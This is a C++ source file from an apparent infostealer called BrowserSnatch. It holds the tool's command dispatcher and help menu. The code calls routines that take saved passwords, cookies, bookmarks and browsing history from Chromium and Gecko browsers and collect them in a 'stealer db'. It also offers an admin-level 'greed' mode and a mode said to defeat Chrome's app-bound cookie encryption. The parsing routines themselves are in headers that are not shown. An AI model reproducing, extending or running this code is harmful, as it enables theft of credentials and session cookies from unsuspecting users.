#include "includes/Visualizer.h"
#include "includes/ChromiumParser.h"
#include "includes/GeckoParser.h"
#include "includes/AppBoundKeyParser.h"

Visualizer::Visualizer()
{}

Visualizer::~Visualizer()
{}

Visualizer::Visualizer(const std::string& converted_username, const std::string& stealer_db)
{
    this->converted_username = converted_username;
    this->stealer_db = stealer_db;
}

BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
{
    std::cout << "BrowserSnatch Executed with {default settings}" << std::endl;
    std::cout << "Snatching passwords & cookies..." << std::endl;
    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_db)
{
    std::cout << "BrowserSnatch Executed with {greed_mode_settings}" << std::endl;
    std::cout << "Snatching everything..." << std::endl;
    if (!CheckProcessPriv())
    {
        std::cerr << "Admin Privileges Required !!!" << std::endl;
        exit(1);
    }

    if (!chromium_cookie_collector(converted_username, stealer_db))
        std::cout << "Chromium Cookie Collector failed!" << std::endl;

    if (!gecko_cookie_collector(converted_username, stealer_db))
        std::cout << "Gecko Cookie Collector failed!" << std::endl;

    if (!chromium_parser(converted_username, stealer_db))
        std::cout << "Chromium Browsers dump failed!" << std::endl;

    if (!gecko_parser(converted_username, stealer_db))
        std::cout << "Gecko Browsers dump failed!" << std::endl;

    if (!chromium_bookmarks_collector(converted_username, stealer_db))
        std::cout << "Chromium Bookmarks Collector failed!" << std::endl;

    if (!gecko_bookmarks_collector(converted_username, stealer_db))
        std::cout << "Gecko Bookmarks Collector failed!" << std::endl;

    if (!chromium_history_collector(converted_username, stealer_db))
        std::cout << "Chromium History Collector failed!" << std::endl;

    if (!gecko_history_collector(converted_username, stealer_db))
        std::cout << "Gecko History Collector failed!" << std::endl;

    // handles app-bound-decryption
    handler(14, "");

    if (std::filesystem::exists(stealer_db)) {
        std::cout << "Stealer db saved: " << stealer_db << std::endl;
        return true;
    }
    else {
        return false;
    }
}

void Visualizer::displayHelp() {
    std::cout << "BrowserSnatch v2.2 - A versatile browser data extraction tool\n";
    std::cout << "(C) 2025 shaddy43\n\n";
    std::cout << "Usage: BrowserSnatch [OPTIONS]\n\n";
    std::cout << "No parameter        Run with default settings, snatch {passwords, cookies} from all browsers\n";
    std::cout << "NOTE:               If it fails, run app-bound-decryption mode first\n\n";
    std::cout << "Options:\n";
    std::cout << "  -h                          Help menu\n";
    std::cout << "  -pass                       Snatch passwords from every browser\n";
    std::cout << "  -pass -c                    Snatch passwords from Chromium browsers only\n";
    std::cout << "  -pass -g                    Snatch passwords from Gecko browsers only\n";
    std::cout << "  -cookies                    Snatch cookies from every browser\n";
    std::cout << "  -cookies -c                 Snatch cookies from Chromium browsers only\n";
    std::cout << "  -cookies -g                 Snatch cookies from Gecko browsers only\n";
    std::cout << "  -bookmarks                  Snatch bookmarks from every browser\n";
    std::cout << "  -bookmarks -c               Snatch bookmarks from Chromium browsers only\n";
    std::cout << "  -bookmarks -g               Snatch bookmarks from Gecko browsers only\n";
    std::cout << "  -history                    Snatch history from every browser\n";
    std::cout << "  -history -c                 Snatch history from Chromium browsers only\n";
    std::cout << "  -history -g                 Snatch history from Gecko browsers only\n";
    std::cout << "  -greed                      Snatch everything {including app-bound-encrypted cookies}\n";
    std::cout << "  -app-bound-decryption       Defeat latest app-bound-encryption\n";
    std::cout << "For more details, visit: https://shaddy43.github.io\n";
}

void Visualizer::handler(int option, std::string service_parameter)
{
    if (option == 1)
    {
        if (!chromium_parser(converted_username, stealer_db))
            std::cerr << "Chromium Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 2)
    {
        if (!gecko_parser(converted_username, stealer_db))
            std::cerr << "Gecko Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 3)
    {
        if (!chromium_parser(converted_username, stealer_db) and !gecko_parser(converted_username, stealer_db))
            std::cerr << "Password Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 4)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db))
            std::cerr << "Chromium Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 5)
    {
        if (!gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Gecko Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 6)
    {
        if (!chromium_cookie_collector(converted_username, stealer_db) and !gecko_cookie_collector(converted_username, stealer_db))
            std::cerr << "Cookie Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 7)
    {
        if (!chromium_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 8)
    {
        if (!gecko_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 9)
    {
        if (!chromium_bookmarks_collector(converted_username, stealer_db) and !gecko_bookmarks_collector(converted_username, stealer_db))
            std::cerr << "Bookmarks Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 10)
    {
        if (!chromium_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 11)
    {
        if (!gecko_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 12)
    {
        if (!chromium_history_collector(converted_username, stealer_db) and !gecko_history_collector(converted_username, stealer_db))
            std::cerr << "History Snatch Failed" << std::endl;
        else
            std::cout << "Stealer db path: " << stealer_db << std::endl;
    }
    else if (option == 13)
    {
        //greed mode
        if (!greed_mode(converted_username, stealer_db))
            std::cerr << "BrowserSnatch executed with {greed mode}: failed" << std::endl;
    }
    else if (option == 14)
    {
        //app-bound-decryption
        std::cout << "Target App-Bound-Encrypted Cookies..." << std::endl;
        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;

        // Pause before exit
        std::cout << "DB PATH: " << stealer_db << std::endl;
        std::cout << "\nPress any key to exit...";
        std::cin.get();
    }
    else if (option == 15)
    {
        //app-bound-decryption
        if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, true, service_parameter))
            std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
    }
    else
    {
        std::cerr << "{LOG} invalid option passed" << std::endl;
    }
}
